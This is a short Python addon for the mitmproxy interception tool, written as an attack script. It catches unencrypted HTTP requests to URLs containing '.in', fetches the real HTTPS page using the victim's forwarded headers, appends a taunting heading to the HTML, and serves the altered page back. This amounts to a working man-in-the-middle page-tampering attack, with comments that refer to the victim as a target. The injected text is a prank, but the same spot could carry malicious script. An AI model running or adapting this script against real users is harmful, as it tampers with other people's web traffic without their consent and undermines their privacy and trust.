from mitmproxy import http
from mitmproxy import ctx
import requests

HEADER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0"

def request(flow: http.HTTPFlow):
    # detect request with filter
    if ".in" in flow.request.pretty_url:
        # check if initial request doesn't establish tls
        if not flow.client_conn.tls_established:
            # get html source code from original destination addr in https
            https_link = flow.request.pretty_url.replace("http://", "https://")
            # include original headers from targets browser
            destination_html = requests.get(https_link, headers=flow.request.headers)
            fake_html = destination_html.text

            # modify html
            modified = fake_html + "<h1>get ground pounded</h1>"

            # send local file if needed (not used in this example)
            with open("pranked.html", "r") as f:
                redirect_html = f.read()
                flow.response = http.Response.make(
                        200,
                        modified,
                        {"Content-Type": "text/html"}
                        )
